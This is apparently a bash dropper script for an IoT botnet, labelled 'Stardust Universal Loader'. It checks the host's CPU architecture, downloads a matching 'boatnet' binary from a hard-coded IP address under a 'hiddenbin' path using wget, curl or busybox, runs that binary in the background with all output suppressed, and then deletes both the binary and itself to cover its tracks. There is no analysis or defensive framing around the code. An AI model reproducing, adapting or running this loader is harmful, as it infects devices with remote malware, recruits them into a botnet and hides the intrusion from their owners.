#!/bin/bash
# Stardust Universal Loader
# Auto-detects architecture and downloads appropriate binary

BASE_URL="http://84.200.81.239/hiddenbin/"
BINARY_NAME="boatnet"

# Function to detect architecture
detect_arch() {
    local arch=$(uname -m)
    local machine=$(uname -s)
    
    case "$arch" in
        x86_64|amd64)
            echo "x86"
            ;;
        i*86)
            echo "x86"
            ;;
        arm*|aarch64)
            if grep -q "ARMv5" /proc/cpuinfo 2>/dev/null; then
                echo "arm5"
            elif grep -q "ARMv6" /proc/cpuinfo 2>/dev/null; then
                echo "arm6"
            elif grep -q "ARMv7" /proc/cpuinfo 2>/dev/null; then
                echo "arm7"
            else
                echo "arm"
            fi
            ;;
        mips*)
            if echo "$arch" | grep -q "mipsel"; then
                echo "mpsl"
            else
                echo "mips"
            fi
            ;;
        ppc*|powerpc*)
            echo "ppc"
            ;;
        m68k)
            echo "m68k"
            ;;
        sh4*)
            echo "sh4"
            ;;
        arc*)
            echo "arc"
            ;;
        *)
            echo "x86"  # Default fallback
            ;;
    esac
}

# Main execution
ARCH=$(detect_arch)
BINARY_URL="${BASE_URL}${BINARY_NAME}.${ARCH}"
LOCAL_BINARY="${BINARY_NAME}"

# Download binary
cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /mnt 2>/dev/null || cd /root 2>/dev/null || cd /

# Try multiple download methods
if command -v wget >/dev/null 2>&1; then
    wget -O "$LOCAL_BINARY" "$BINARY_URL" 2>/dev/null
elif command -v curl >/dev/null 2>&1; then
    curl -s -o "$LOCAL_BINARY" "$BINARY_URL" 2>/dev/null
elif command -v busybox >/dev/null 2>&1; then
    busybox wget -O "$LOCAL_BINARY" "$BINARY_URL" 2>/dev/null
fi

# Make executable and run
if [ -f "$LOCAL_BINARY" ]; then
    chmod +x "$LOCAL_BINARY" 2>/dev/null
    ./"$LOCAL_BINARY" "$@" 2>/dev/null &
    
    # Clean up after execution
    sleep 5
    rm -f "$LOCAL_BINARY" 2>/dev/null
fi

# Additional cleanup
rm -f "${0}" 2>/dev/null